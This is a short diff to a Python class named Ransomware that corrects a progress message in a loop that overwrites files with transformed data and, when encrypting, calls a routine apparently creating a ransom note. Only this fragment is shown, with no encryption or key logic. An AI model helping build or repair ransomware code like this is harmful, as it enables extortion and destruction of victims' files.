@@ -59,7 +59,7 @@ class Ransomware:
                 with open(file_abs_full_path, 'wb') as file_bytes:
                     file_bytes.write(final_data)
                 count += 1
-                print(f"[+] {'Encrypted' if action == 'encrypted' else 'Decrypted'} {count} files...", end='\r')
+                print(f"[+] {'Encrypted' if action == 'encrypt' else 'Decrypted'} {count} files...", end='\r')
 
         if action == "encrypt":
             Ransomware.createTxt(directory)
